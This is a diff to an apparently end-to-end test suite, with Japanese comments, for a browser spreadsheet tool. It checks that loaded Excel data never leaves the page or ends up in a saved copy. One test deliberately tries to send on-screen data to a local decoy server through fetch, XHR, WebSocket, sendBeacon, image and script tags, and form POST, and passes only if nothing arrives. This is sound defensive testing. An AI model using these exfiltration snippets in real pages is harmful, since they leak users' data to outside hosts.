@@ -933,6 +933,27 @@ await check('ツール本体をダブルクリックできる .html として保
   assert(!/<link[^>]+href="http/i.test(html), '外部スタイルの読み込みが残っている');
 });
 
+await check('保存したツールに、読み込んだ Excel の中身が混ざらない', async () => {
+  /**
+   * ここまでのテストで Excel を読み込み、値の書き換えまで行っている。
+   * その状態で保存したファイルに中身が残ると、共有フォルダーに置いた
+   * 瞬間に社内へ流出することになるため、必ず確認する。
+   *
+   * 保存元は「React が描画する前の HTML」なので、本文は空の入れ物だけの
+   * はずである (src/security/selfCopy.ts の captureSelf)。
+   */
+  const html = readFileSync(sharedToolPath, 'utf8');
+  const body = html.slice(html.lastIndexOf('<body'));
+  assert(
+    /^<body[^>]*>\s*<div id="root"><\/div>\s*<\/body>\s*<\/html>\s*$/.test(body),
+    `保存したファイルの中身が空でない: ${body.slice(0, 300)}`,
+  );
+  // 念のため、サンプルにしか出てこない文字列でも確認する
+  for (const word of ['原価管理表', '材料費', '費目', '1,000,000']) {
+    assert(!html.includes(word), `保存したファイルに「${word}」が残っている`);
+  }
+});
+
 await check('共有フォルダーから、通信できない状態でも単体で動く', async () => {
   // ネットワークを完全に遮断した状態で開く。
   // 社内で LAN から切り離しても動くことの確認。
@@ -1042,14 +1063,36 @@ await page.screenshot({ path: join(SHOTS, '06-tabs.png') });
 // --------------------------------------------------------------------------
 console.log('\n\x1b[1mサーバー配信時 (GitHub Pages を想定)\x1b[0m');
 
-const server = createServer((req, res) => {
-  if (req.url === '/favicon.ico') {
-    res.writeHead(404).end();
-    return;
-  }
-  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-  res.end(readFileSync(DIST));
-});
+/**
+ * サーバーが実際に受け取ったものを 1 件残らず記録する。
+ * 「外部へ出ていない」は、ブラウザー側の見え方ではなく
+ * 受け取り側の記録で示さないと証拠にならない。
+ */
+const serverLog = [];
+const logging = (tag) => (req, res, respond) => {
+  const chunks = [];
+  req.on('data', (c) => chunks.push(c));
+  req.on('end', () => {
+    serverLog.push({ tag, method: req.method, url: req.url, body: Buffer.concat(chunks).toString('utf8') });
+    respond(req, res);
+  });
+};
+
+const server = createServer((req, res) =>
+  logging('本体')(req, res, () => {
+    if (req.url === '/favicon.ico') {
+      res.writeHead(404).end();
+      return;
+    }
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+    res.end(readFileSync(DIST));
+  }),
+);
+
+// 持ち出し先を装う「おとり」。ここに 1 件でも届いたら失敗。
+const decoy = createServer((req, res) => logging('おとり')(req, res, () => res.writeHead(200).end('ok')));
+await new Promise((r) => decoy.listen(0, '127.0.0.1', r));
+const decoyOrigin = `http://127.0.0.1:${decoy.address().port}`;
 await new Promise((r) => server.listen(0, '127.0.0.1', r));
 const origin = `http://127.0.0.1:${server.address().port}`;
 
@@ -1067,7 +1110,13 @@ await check('サーバー配信であることが画面に表示される', asyn
   // 起動元の説明とダウンロードの案内は「ファイル」タブに出る
   await hostedPage.click('.ribbon-tab:has-text("ファイル")');
   const body = await hostedPage.textContent('.ribbon-panel');
-  assert(body.includes('サーバーから開いています'), `起動元の案内がない: ${body.slice(0, 200)}`);
+  assert(body.includes('サーバーから読み込んでいます'), `起動元の案内がない: ${body.slice(0, 200)}`);
+  // 「サーバーから開いている」が「データが外へ出る」と誤解されないよう、
+  // その場で否定しておくこと (実際に出ていないことは後段の検証で確かめる)
+  assert(
+    body.includes('サーバーへ送られることはありません'),
+    `送信しない旨の説明がない: ${body.slice(0, 300)}`,
+  );
   assert(body.includes('ツール本体を保存'), 'オフライン保存の案内がない');
 });
 
@@ -1143,8 +1192,85 @@ await check('サーバー配信でも Excel を処理できる', async () => {
 });
 
 await hostedPage.screenshot({ path: join(SHOTS, '07-hosted.png') });
+
+// --------------------------------------------------------------------------
+// 「サーバーから開いている間に、Excel の中身が外へ出ていないか」の検証。
+// 社内データを扱う以上ここが最重要なので、受け取り側の記録で確かめる。
+// --------------------------------------------------------------------------
+console.log('\n\x1b[1m持ち出しの検証 (受け取り側の記録で確認)\x1b[0m');
+
+await check('サーバーが受け取ったのはページ本体の 1 件だけ', () => {
+  const mine = serverLog.filter((r) => r.tag === '本体');
+  assert(mine.length === 1, `${mine.length} 件受け取っている: ${mine.map((r) => `${r.method} ${r.url}`).join(', ')}`);
+  assert(mine[0].method === 'GET', `メソッド: ${mine[0].method}`);
+  assert(mine[0].body === '', `本文が送られている: ${mine[0].body.slice(0, 200)}`);
+});
+
+await check('サーバーへ送られた中に Excel の中身が 1 文字も無い', () => {
+  // サンプルにしか出てこない文字列が、URL にも本文にも出ないこと
+  const all = serverLog.map((r) => `${decodeURIComponent(r.url)} ${r.body}`).join('\n');
+  for (const word of ['原価管理表', '材料費', '費目', '1,000,000']) {
+    assert(!all.includes(word), `「${word}」がサーバーへ送られている`);
+  }
+});
+
+await check('あらゆる手段で持ち出しを試みても、1 件も外へ出ない', async () => {
+  /**
+   * 実装の善意ではなく、実際に届くかどうかで判定する。
+   * 画面に見えている値を「おとりサーバー」へ送ろうと総当たりし、
+   * おとり側が 1 件でも受け取ったら失敗とする。
+   */
+  const before = serverLog.filter((r) => r.tag === 'おとり').length;
+  await hostedPage.evaluate(async (decoyUrl) => {
+    const data = document.querySelector('.grid-canvas')?.textContent?.slice(0, 80) ?? 'DATA';
+    const attempt = async (fn) => { try { await fn(); } catch { /* 遮断されるのが正常 */ } };
+    await attempt(() => fetch(`${decoyUrl}/leak`, { method: 'POST', body: data }));
+    await attempt(() => { const x = new XMLHttpRequest(); x.open('POST', `${decoyUrl}/leak`); x.send(data); });
+    await attempt(() => new WebSocket(decoyUrl.replace('http', 'ws')));
+    await attempt(() => new EventSource(`${decoyUrl}/leak`));
+    await attempt(() => navigator.sendBeacon(`${decoyUrl}/leak`, data));
+    await attempt(() => new RTCPeerConnection());
+    await attempt(() => navigator.serviceWorker.register(`${decoyUrl}/sw.js`));
+    // タグを使った持ち出し (CSP で止まるべきもの)
+    await attempt(() => { const i = new Image(); i.src = `${decoyUrl}/leak?d=${encodeURIComponent(data)}`; });
+    await attempt(() => {
+      const sc = document.createElement('script');
+      sc.src = `${decoyUrl}/leak?d=${encodeURIComponent(data)}`;
+      document.head.appendChild(sc);
+    });
+    await attempt(() => {
+      const f = document.createElement('form');
+      f.method = 'POST';
+      f.action = `${decoyUrl}/leak`;
+      const inp = document.createElement('input');
+      inp.name = 'd';
+      inp.value = data;
+      f.appendChild(inp);
+      document.body.appendChild(f);
+      f.submit();
+    });
+  }, decoyOrigin);
+
+  // 遅れて届く可能性があるので少し待つ
+  await new Promise((r) => setTimeout(r, 2000));
+  const hits = serverLog.filter((r) => r.tag === 'おとり').slice(before);
+  assert(
+    hits.length === 0,
+    `${hits.length} 件が外へ出た: ${hits.map((r) => `${r.method} ${r.url} ${r.body}`.slice(0, 200)).join(' / ')}`,
+  );
+});
+
+await check('持ち出しの試みは画面に記録される', async () => {
+  const badge = await hostedPage.textContent('[data-testid="guard-badge"]');
+  assert(badge.includes('遮断'), `タイトルバーに出ていない: ${badge}`);
+  const tip = await hostedPage.locator('[data-testid="guard-badge"]').getAttribute('title');
+  assert(/送ろうとした試み/.test(tip), `内訳が出ていない: ${tip}`);
+  // 資源の遮断について、事実と違う説明をしていないこと
+  assert(!tip.includes('データの送信ではありません'), '資源の遮断を「送信ではない」と言い切っている');
+});
 await hostedPage.close();
 server.close();
+decoy.close();
 
 await check('JS エラーが出ていない', () => {
   const real = consoleErrors.filter((e) => !e.includes('外部通信ガード') && !e.includes('NetworkBlocked'));
